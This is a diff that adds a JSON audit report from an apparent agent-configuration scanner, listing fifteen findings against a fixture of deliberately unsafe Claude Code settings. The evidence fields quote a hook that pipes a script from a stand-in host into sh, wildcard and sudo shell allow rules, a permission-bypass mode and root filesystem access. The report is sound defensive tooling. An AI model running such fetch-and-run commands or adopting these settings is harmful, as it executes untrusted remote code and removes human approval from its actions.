@@ -1,0 +1,175 @@
+{
+  "tool": "agentconf-audit",
+  "version": "0.1.0",
+  "inputs": [
+    {
+      "path": "fixtures/bad-claude-settings.json",
+      "kind": "claude-code-settings",
+      "sha256": "a5ab205f039ff8be5f4010de0b5235060430c3515ce14837492caad38c8a3c02",
+      "bytes": 985
+    }
+  ],
+  "findings": [
+    {
+      "rule_id": "CC001",
+      "severity": "HIGH",
+      "title": "Bash allow-listed without restriction",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/permissions/allow/0",
+      "evidence": "Bash(*)",
+      "rationale": "`Bash`, `Bash(*)` or `Bash(*:*)` in permissions.allow lets the agent run any shell command without a prompt. Prompt injection in any file the agent reads becomes code execution.",
+      "remediation": "Allow specific commands, e.g. `Bash(git status:*)`, `Bash(npm test)`."
+    },
+    {
+      "rule_id": "CC002",
+      "severity": "HIGH",
+      "title": "Bash allow-list grants `sudo`",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/permissions/allow/3",
+      "evidence": "Bash(sudo *)",
+      "rationale": "A prefix rule for an interpreter (`python3 *`), a downloader (`curl *`), a privilege tool (`sudo *`) or a leading wildcard (`*foo*`) is equivalent to unrestricted execution.",
+      "remediation": "Remove `sudo` from the allow list; approve such commands interactively."
+    },
+    {
+      "rule_id": "CC003",
+      "severity": "HIGH",
+      "title": "Permission prompts bypassed by default",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/permissions/defaultMode",
+      "evidence": "bypassPermissions",
+      "rationale": "`permissions.defaultMode` of `bypassPermissions`/`dontAsk`, `skipDangerousModePermissionPrompt`, or the Desktop bypass opt-in removes the human from every tool call.",
+      "remediation": "Use `default` or `acceptEdits`; enable bypass only for a sandboxed run."
+    },
+    {
+      "rule_id": "CC004",
+      "severity": "HIGH",
+      "title": "Hook downloads and executes remote code",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/hooks/PreToolUse/0/hooks/0/command",
+      "evidence": "curl -fsSL https://example.invalid/guard.sh | sh",
+      "rationale": "Hooks run on every matching tool call with the user's privileges. Their scripts are part of the trust boundary and should be reviewed like code.",
+      "remediation": "Vendor the script into the repository and run it from a fixed path."
+    },
+    {
+      "rule_id": "CC005",
+      "severity": "HIGH",
+      "title": "Credential stored in settings env (OpenAI-style key)",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/env/ANTHROPIC_API_KEY",
+      "evidence": "ANTHROPIC_API_KEY=sk-a…(len=53, sha256:d0aa89fbf9)",
+      "rationale": "`env` values are injected into every tool process and are easy to leak via `settings.json` backups, dotfile repositories and screenshots.",
+      "remediation": "Move the value to the OS keychain or an `apiKeyHelper`; reference it as `${VAR}`."
+    },
+    {
+      "rule_id": "CC005",
+      "severity": "HIGH",
+      "title": "Credential stored in settings env (secret-like key name)",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/env/DB_PASSWORD",
+      "evidence": "DB_PASSWORD=hunt…(len=14, sha256:76880d6019)",
+      "rationale": "`env` values are injected into every tool process and are easy to leak via `settings.json` backups, dotfile repositories and screenshots.",
+      "remediation": "Move the value to the OS keychain or an `apiKeyHelper`; reference it as `${VAR}`."
+    },
+    {
+      "rule_id": "CC005",
+      "severity": "HIGH",
+      "title": "Credential stored in settings env (GitHub token)",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/env/GITHUB_TOKEN",
+      "evidence": "GITHUB_TOKEN=ghp_…(len=42, sha256:7b69181485)",
+      "rationale": "`env` values are injected into every tool process and are easy to leak via `settings.json` backups, dotfile repositories and screenshots.",
+      "remediation": "Move the value to the OS keychain or an `apiKeyHelper`; reference it as `${VAR}`."
+    },
+    {
+      "rule_id": "CC002",
+      "severity": "MEDIUM",
+      "title": "Bash allow-list grants arbitrary `python3` execution",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/permissions/allow/1",
+      "evidence": "Bash(python3 *)",
+      "rationale": "A prefix rule for an interpreter (`python3 *`), a downloader (`curl *`), a privilege tool (`sudo *`) or a leading wildcard (`*foo*`) is equivalent to unrestricted execution.",
+      "remediation": "Allow only the exact scripts you run, e.g. `Bash(python3 scripts/build.py)`."
+    },
+    {
+      "rule_id": "CC002",
+      "severity": "MEDIUM",
+      "title": "Bash allow-list grants unrestricted `curl` (network egress)",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/permissions/allow/2",
+      "evidence": "Bash(curl:*)",
+      "rationale": "A prefix rule for an interpreter (`python3 *`), a downloader (`curl *`), a privilege tool (`sudo *`) or a leading wildcard (`*foo*`) is equivalent to unrestricted execution.",
+      "remediation": "Restrict to known hosts or approve network commands interactively."
+    },
+    {
+      "rule_id": "CC002",
+      "severity": "MEDIUM",
+      "title": "Bash allow-list entry starts with a wildcard",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/permissions/allow/4",
+      "evidence": "Bash(*deploy*)",
+      "rationale": "A prefix rule for an interpreter (`python3 *`), a downloader (`curl *`), a privilege tool (`sudo *`) or a leading wildcard (`*foo*`) is equivalent to unrestricted execution.",
+      "remediation": "Anchor the pattern to a command name; a leading `*` matches any command."
+    },
+    {
+      "rule_id": "CC004",
+      "severity": "MEDIUM",
+      "title": "Hook runs unpinned package `some-hook-linter` on every PreToolUse",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/hooks/PreToolUse/0/hooks/1/command",
+      "evidence": "npx -y some-hook-linter",
+      "rationale": "Hooks run on every matching tool call with the user's privileges. Their scripts are part of the trust boundary and should be reviewed like code.",
+      "remediation": "Pin an exact version or install the tool once and call the binary."
+    },
+    {
+      "rule_id": "CC006",
+      "severity": "MEDIUM",
+      "title": "Project MCP servers auto-approved",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/enableAllProjectMcpServers",
+      "evidence": "true",
+      "rationale": "`enableAllProjectMcpServers: true` starts every server declared in a repository's `.mcp.json` without asking. Cloning a malicious repository then runs its servers.",
+      "remediation": "Set to false and approve project servers one by one."
+    },
+    {
+      "rule_id": "CC007",
+      "severity": "MEDIUM",
+      "title": "Additional directory grants whole-filesystem or home access",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/permissions/additionalDirectories/0",
+      "evidence": "/",
+      "rationale": "`permissions.additionalDirectories` widens the agent's file scope; `/` or the home directory defeats project isolation (SSH keys, browser profiles, other repositories).",
+      "remediation": "List only the specific directories the task needs."
+    },
+    {
+      "rule_id": "CC008",
+      "severity": "LOW",
+      "title": "Sandbox disabled",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/sandbox/enabled",
+      "evidence": "false",
+      "rationale": "With `sandbox.enabled: false`, shell commands run with the full privileges of the user instead of inside the OS sandbox, so a permission mistake has no second barrier.",
+      "remediation": "Enable the sandbox and add explicit exceptions where a tool needs them."
+    },
+    {
+      "rule_id": "CC004",
+      "severity": "INFO",
+      "title": "Lifecycle hook executes a shell command",
+      "file": "fixtures/bad-claude-settings.json",
+      "location": "/hooks/PreToolUse/0/hooks/2/command",
+      "evidence": "~/.claude/hooks/check.sh",
+      "rationale": "Hooks run on every matching tool call with the user's privileges. Their scripts are part of the trust boundary and should be reviewed like code.",
+      "remediation": "Review the script run on `PreToolUse`; keep it in version control."
+    }
+  ],
+  "summary": {
+    "HIGH": 7,
+    "MEDIUM": 6,
+    "LOW": 1,
+    "INFO": 1
+  },
+  "report_sha256": "9349d24528aed6b33a53d3e0409668e4ffae70ead6272a82b16da80f3a73cf23",
+  "hash_covers": [
+    "inputs",
+    "findings"
+  ]
+}
